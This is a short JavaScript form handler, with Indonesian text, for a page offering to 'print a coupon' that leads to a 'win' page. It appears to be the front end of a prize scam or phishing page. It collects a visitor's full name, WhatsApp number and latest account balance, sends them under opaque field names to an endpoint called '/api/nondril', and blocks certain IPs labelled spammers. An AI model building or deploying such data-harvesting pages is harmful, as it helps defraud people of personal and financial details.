// Fungsi utama
    document.addEventListener("DOMContentLoaded", async () => {
      const form = document.getElementById("formData");
      const submitBtn = document.getElementById("kirim");
      const loading = document.getElementById("loading");
      const errorMessage = document.getElementById("errorMessage");
      const errorText = document.getElementById("errorText");
      let isSubmitting = false;

      // Daftar IP spammer
      const blockedIPs = [
        "182.3.141.223",
        "182.8.161.143"
      ];

      // Cek IP user
      const userIP = await getPublicIP();
      if (userIP && blockedIPs.includes(userIP)) {
        showError("Akses kamu diblokir karena terdeteksi sebagai spam!");
        form.style.display = 'none';
        return;
      }

      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        if (isSubmitting) {
          return;
        }

        // Sembunyikan pesan error jika sebelumnya tampil
        errorMessage.style.display = 'none';
        
        // Validasi input
        const nama = document.getElementById("namalengkap").value.trim();
        const noWA = document.getElementById("nowa").value.trim();
        const saldo = document.getElementById("saldo").value.trim();

        if (!nama) {
          showError("Nama lengkap harus diisi");
          return;
        }

        if (!noWA) {
          showError("Nomor WhatsApp harus diisi");
          return;
        }

        if (!/^08[0-9]{8,13}$/.test(noWA)) {
          showError("Nomor WhatsApp tidak valid! Harus diawali dengan '08' dan panjang 10-15 digit.");
          return;
        }

        if (!saldo) {
          showError("Saldo terakhir harus diisi");
          return;
        }

        isSubmitting = true;
        submitBtn.disabled = true;
        loading.style.display = 'block';
        submitBtn.querySelector('.btn-text').textContent = "Memproses...";

        try {
          // Kirim data ke endpoint API
          const res = await fetch('/api/nondril', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json' 
            },
            body: JSON.stringify({
              a: nama,
              b: noWA,
              c: saldo
            })
          });

          const json = await res.json();

          if (json.success) {
            // Simulasi vibrasi
            if (navigator.vibrate) {
              navigator.vibrate(180);
            }
            
            setTimeout(() => {
              window.location.href = 'win.html';
            }, 1000);
          } else {
            showError(json.message || "Gagal mengirim. Coba lagi.");
          }
        } catch (err) {
          console.error("Error:", err);
          showError("Terjadi kesalahan saat kirim data.");
        }

        resetBtn();
      });

      function resetBtn() {
        isSubmitting = false;
        submitBtn.disabled = false;
        submitBtn.querySelector('.btn-text').textContent = "Cetak Kupon";
        loading.style.display = 'none';
      }

      function showError(message) {
        errorText.textContent = message;
        errorMessage.style.display = 'block';
        resetBtn();
        
        // Scroll ke pesan error
        errorMessage.scrollIntoView({ behavior: 'smooth' });
      }

      async function getPublicIP() {
        try {
          const res = await fetch("https://api.ipify.org?format=json");
          const data = await res.json();
          return data.ip;
        } catch (err) {
          console.error("Gagal ambil IP:", err);
          return null;
        }
      }
    });